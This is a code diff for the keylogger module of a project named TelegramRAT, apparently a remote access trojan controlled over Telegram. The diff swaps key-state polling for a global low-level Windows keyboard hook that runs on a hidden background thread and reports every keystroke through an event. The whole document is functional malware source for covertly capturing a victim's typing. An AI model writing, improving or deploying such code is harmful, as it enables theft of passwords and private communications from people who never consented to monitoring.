@@ -1,31 +1,114 @@
-using TelegramRAT.Utilities;
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Threading;
 
 namespace TelegramRAT.Features;
 
-static class Keylogger
+public static class Keylogger
 {
-    public static void GetPressingKeys(List<uint> keys)
-    {
-        keys.Clear();
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private const int WM_SYSKEYDOWN = 0x0104;
 
-        for (uint i = 0; i < 256; i++)
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("user32.dll")]
+    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
+
+    [DllImport("user32.dll")]
+    private static extern bool TranslateMessage(ref MSG lpMsg);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr DispatchMessage(ref MSG lpMsg);
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct MSG
+    {
+        public IntPtr hwnd;
+        public uint message;
+        public IntPtr wParam;
+        public IntPtr lParam;
+        public uint time;
+        public POINT pt;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct POINT
+    {
+        public int x;
+        public int y;
+    }
+
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    public static event EventHandler<uint>? KeyDown;
+
+    private static IntPtr _hookID = IntPtr.Zero;
+    private static LowLevelKeyboardProc? _proc;
+    private static Thread? _hookThread;
+    private static bool _isRunning;
+
+    public static void Start()
+    {
+        if (_isRunning) return;
+        _isRunning = true;
+
+        _hookThread = new Thread(() =>
         {
-            int state = WinAPI.GetAsyncKeyState(i);
-            if (state != 0)
+            _proc = HookCallback;
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule!)
             {
-                keys.Add(i);
+                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
             }
+
+            MSG msg;
+            while (_isRunning && GetMessage(out msg, IntPtr.Zero, 0, 0) > 0)
+            {
+                TranslateMessage(ref msg);
+                DispatchMessage(ref msg);
+            }
+
+            if (_hookID != IntPtr.Zero)
+            {
+                UnhookWindowsHookEx(_hookID);
+                _hookID = IntPtr.Zero;
+            }
+        });
+
+        _hookThread.IsBackground = true;
+        _hookThread.Start();
+    }
+
+    public static void Stop()
+    {
+        _isRunning = false;
+        if (_hookID != IntPtr.Zero)
+        {
+            UnhookWindowsHookEx(_hookID);
+            _hookID = IntPtr.Zero;
         }
     }
 
-    enum VirtualKeyCodesTable
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
     {
-        LBUTTON = 0x01,
-        BACKSPACE = 0x08,
-        TAB = 0x09,
-        SHIFT = 0x10,
-        CTRL = 0x21,
-        CAPSLOCK = 0x14,
-        ESC = 0x1B
+        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
+        {
+            int vkCode = Marshal.ReadInt32(lParam);
+            KeyDown?.Invoke(null, (uint)vkCode);
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
 }
